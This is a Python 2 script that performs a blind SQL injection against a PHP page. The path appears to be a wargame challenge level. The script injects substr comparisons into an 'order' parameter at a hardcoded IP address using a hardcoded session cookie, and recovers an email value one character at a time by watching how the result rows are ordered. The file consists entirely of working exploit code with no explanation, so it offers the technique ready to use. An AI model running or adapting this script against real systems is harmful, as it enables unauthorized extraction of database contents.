#!/usr/bin/python
import httplib


def makePayload(statement):
  return "/los2/cobolt_260067a046708d42f308ae831e4fa51f.php?order=substr(email,1,%d)='%s%s'/**/desc" % (len(statement[0])+1,statement[0], chr(statement[1])) 


def checkResponse(response):
   
  #return (response.find("Hello admin") != -1)
  return (response.find("admin") < response.find("krystal"))


def doAssert(conn, statement):
  pay = makePayload(statement)
  conn.request("GET", pay, "", header)
  response = conn.getresponse()
  content = response.read()

  return checkResponse(content)

if __name__ == "__main__":
  url = "119.81.231.181"
  header = {"cookie":"PHPSESSID=35hbouvl2o7gv5t0crd24g2kq5"}
  conn = httplib.HTTPConnection(url)
  result ="y"
  for idx in range(1,25):
    print "idx %d" % idx
    for code in range(46,127): # 46 == '.' in ascii
      if doAssert(conn, (result, code)):
        result += (chr(code))
        print result.lower()
        break
  print ''.join(result).lower()
